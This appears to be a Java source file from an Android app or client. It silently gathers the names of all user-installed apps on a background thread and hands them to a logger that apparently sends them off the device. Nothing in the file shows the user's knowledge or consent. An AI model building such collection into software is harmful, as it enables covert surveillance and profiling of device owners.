package com.my.myapp.core.device;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import com.my.myapp.core.client.Logger;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

public class PackageReader {
    private final Context context;

    public PackageReader(Context ctx) { this.context = ctx; }

    public void sendInstalledApps() {
        new Thread(() -> {
            try {
                PackageManager pm = context.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JSONArray arr = new JSONArray();

                for (ApplicationInfo app : apps) {
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        arr.put(app.loadLabel(pm).toString());
                    }
                }

                JSONObject data = new JSONObject();
                data.put("type", "apps");
                data.put("apps", arr);
                Logger.sendLog("apps", data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}